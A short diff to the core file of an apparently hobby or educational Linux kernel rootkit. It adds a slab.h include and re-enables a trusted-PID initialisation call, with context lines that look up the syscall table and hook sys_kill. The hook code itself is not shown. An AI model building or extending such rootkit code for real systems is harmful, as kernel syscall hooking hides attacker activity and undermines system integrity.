@@ -6,6 +6,7 @@
 #include <linux/module.h> // core header for loading module into kernel
 #include <linux/kernel.h> //contains types, macros, functions for the kernel   e.g. KERN_INFO
 #include <linux/string.h> // contains functions for string operations
+#include <linux/slab.h> //contains memory functions like kzalloc
 
 static int BUFFER_SIZE = 2048;
 static char ROOTKIT_ID[] =  "Y&&U3im9Y2jk";
@@ -24,7 +25,7 @@ static void __exit ModuleExit(void);
 static int __init ModuleInit(void) {
 	printk("[rootkit][core.c::ModuleInit] DEBUG    rootkit initiated\n");  //DEBUG
 	init_logging();
-	i//nit_trusted_pid_head();
+	init_trusted_pid_head();
 	log_msg("[core.c::ModuleInit] logging initiated\n");
 	get_syscall_table();
 	install_hook(&sys_kill);
